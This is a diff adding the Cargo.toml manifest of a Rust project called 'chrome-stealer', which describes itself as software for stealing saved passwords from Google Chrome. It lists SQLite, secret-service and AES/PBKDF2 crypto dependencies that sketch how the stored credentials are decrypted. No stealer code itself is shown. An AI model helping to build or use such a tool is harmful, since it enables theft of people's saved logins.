@@ -1,0 +1,22 @@
+[package]
+name = "chrome-stealer"
+version = "0.1.0"
+edition = "2021"
+description = "Software for stealing saved passwords from Google Chrome browser implemented in Rust"
+authors = ["astronmax"]
+license = "Apache-2.0"
+readme = "README.md"
+repository = "https://github.com/astronmax/chrome-stealer"
+
+[profile.dev]
+opt-level = 2
+
+[dependencies]
+rusqlite = { version = "0.27.0", features = ["bundled"] }
+whoami = "1.2.1"
+secret-service = "2.0.0"
+pbkdf2 = "0.10"
+hmac = "0.12.1"
+sha-1 = "0.10.0"
+cbc = "0.1.2"
+aes = "0.8.1"
